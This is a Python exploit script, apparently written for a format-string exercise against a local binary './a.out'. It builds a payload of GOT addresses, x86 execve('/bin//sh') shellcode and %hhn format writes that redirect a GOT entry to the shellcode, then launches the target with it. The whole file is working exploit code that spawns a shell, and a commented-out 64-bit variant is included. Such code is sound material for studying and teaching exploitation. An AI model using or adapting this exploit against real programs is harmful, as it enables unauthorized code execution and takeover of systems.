import sys
import struct
#import subprocess
from subprocess import Popen

addr_got = int(sys.argv[1], 16)
addr_buf = int(sys.argv[2], 16)
index = int(sys.argv[3])

shellcode = b"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

#shellcode = b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x6c\x73\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05"


buf = struct.pack('<I', addr_got)
buf += struct.pack('<I', addr_got+1)
buf += struct.pack('<I', addr_got+2)
buf += struct.pack('<I', addr_got+3)

#print("--- struct pack addr_got")
#print(struct.pack('<I', addr_got))
#print(struct.pack('<I', addr_got+1))
#print(struct.pack('<I', addr_got+2))
#print(struct.pack('<I', addr_got+3))

#print("shell code")
#print(shellcode)

# addr_got_hex = format(addr_got, '08x')
# for i in range(0, 4):
#     addr_got_hex_slice = [addr_got_hex[i : i+2] for i in range(0, len(addr_got_hex), 2)]
#     length = len(addr_got_hex_slice)
#     for j in range(0, length):
#         ele = int(addr_got_hex_slice[length - (j + 1)], 16)
#         print("ele%d: %d" % (j, ele))
#         s = "x%d" % ele
#         print(s)
#         print(s.encode())

# print("addr_got %s" % format(addr_got, '08x'))

buf += shellcode

#print("addr_buf:%s" % addr_buf)
addr_buf_hex = format(addr_buf + 16, '08x')
addr_buf_hex_slice = [addr_buf_hex[i : i+2] for i in range(0, len(addr_buf_hex), 2)]
#print("addr_buf_hex_slice:%s" % addr_buf_hex_slice)

#print("addr_buf_hex:%s" % addr_buf_hex )
#print("len:%s" % len(addr_buf_hex_slice))

a = []
length = len(addr_buf_hex_slice)
for i in range(0, length):
    ele = int(addr_buf_hex_slice[length - (i + 1)], 16)
    # ele = int(addr_buf_hex_slice[i], 16)
    # print("%d, %d" % (i,ele))
    a.append(ele)

#a = map(ord, struct.pack('<I', addr_buf + 16))

#print("a:%s" % a)
#print("b:%s" % b)
#print("len:%d" % len(buf))

a[3] = ((a[3]-a[2]-1) % 0x100) + 1
#print("a[3]:%d" % a[3])
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
#print("a[2]:%d" % a[2])
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
#print("a[1]:%d" % a[1])
a[0] = ((a[0]-len(buf)-1) % 0x100) + 1
#print("a[0]:%d" % a[0])

s = "%%%dc%%%d$hhn" % (a[0], index)
buf += s.encode()
s = "%%%dc%%%d$hhn" % (a[1], index + 1)
buf += s.encode()
s = "%%%dc%%%d$hhn" % (a[2], index + 2)
buf += s.encode()
s = "%%%dc%%%d$hhn" % (a[3], index + 3)
buf += s.encode()

#print(buf)

with open('./buf', 'wb') as f:
    f.write(buf)

p = Popen(['./a.out', buf])
p.wait()

#bb= 'AAAA'
#cp = subprocess.run(['./a.out', buf], encoding = 'utf-8', stdout=subprocess.PIPE)
#if cp.returncode != 0:
#    print("[!!!] failed")

#print(cp.stdout)

